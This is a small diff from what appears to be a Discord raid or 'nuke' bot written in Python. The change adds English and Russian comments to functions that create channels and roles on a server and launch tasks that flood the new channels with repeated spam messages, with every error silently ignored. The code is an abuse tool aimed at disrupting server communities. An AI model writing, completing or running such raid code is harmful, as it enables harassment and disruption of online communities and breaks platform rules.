@@ -11,10 +11,10 @@ async def spam(ch,text,count):
     except: pass
 
 async def spamchannel(ctx):
-    try: c = await ctx.guild.create_text_channel('')
+    try: c = await ctx.guild.create_text_channel('') # name channels / название каналов
     except: pass
     else: create_task(spam(ch=c,text=TEXT,count=MESSAGE_COUNT))
 
 async def spamrole(ctx):
-    try: await ctx.guild.create_role(name='')
+    try: await ctx.guild.create_role(name='') # name role / название роли
     except: pass
